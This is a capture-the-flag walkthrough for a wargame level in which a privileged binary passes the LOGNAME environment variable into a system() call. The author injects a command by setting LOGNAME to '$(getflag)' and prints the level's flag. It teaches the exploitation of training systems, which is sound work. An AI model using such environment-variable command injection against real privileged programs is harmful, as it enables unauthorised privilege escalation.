# level07

We're presented with an executable. We examine it with `gdb`.

It seems to call the following functions : `getegid`, `geteuid`, `setresgid`, `setresuid`, `getenv`, `asprintf`, and `system`.

This is very similar to level03, but with a slight variations. We run `strings ./level07` and have a look. We see :

```
/bin/echo %s
```

This is `printf` formatting ; judging from gdb, we can assume the program does something like this :

```
char *buf;
asprintf(&buf, "/bin/echo %s", getenv(SOME_ENV_VALUE));
system(buf);
```

`strings ./level07` also reveals the string `LOGNAME`, right above `/bin/echo %s`. We when execute the program right now, it prints `level07`. A quick `env | grep level07` reveals :

```
LOGNAME=level07
```

It checks out ; we can try modifying `LOGNAME` to get what we want. A `system("/bin/echo $(getflag)")` would work. We run :

```
export LOGNAME='$(getflag)'
./level07
```

## The flag

The program is successfully exploited and we get the level's flag :

```
fiumuikeil55xe9cu4dood66h
```